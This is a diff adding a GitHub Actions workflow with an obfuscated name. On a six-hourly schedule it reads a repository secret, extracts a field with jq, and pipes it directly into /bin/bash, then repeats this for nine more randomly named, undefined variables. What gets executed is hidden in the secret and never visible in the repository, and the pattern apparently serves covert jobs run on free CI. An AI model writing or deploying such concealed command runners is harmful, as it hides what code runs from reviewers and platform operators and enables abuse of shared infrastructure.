@@ -1,0 +1,28 @@
+name: shoushenguolaiera
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '42 2/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: shoushenguolaiera
+        env:
+          b92: ${{ secrets.b92 }}
+        run: |
+          echo $b92 | jq -r .rbu68 | /bin/bash
+          echo $fmxi8 | jq -r .moq34651 | /bin/bash
+          echo $yqmz73 | jq -r .fjy95 | /bin/bash
+          echo $rhji5 | jq -r .yo2977 | /bin/bash
+          echo $tsse91 | jq -r .qk36 | /bin/bash
+          echo $mv5 | jq -r .p36 | /bin/bash
+          echo $bzcvg0 | jq -r .ec47 | /bin/bash
+          echo $ip93 | jq -r .gl366 | /bin/bash
+          echo $esagt0699 | jq -r .koj01963 | /bin/bash
+          echo $yufaw47724 | jq -r .ev131 | /bin/bash
+
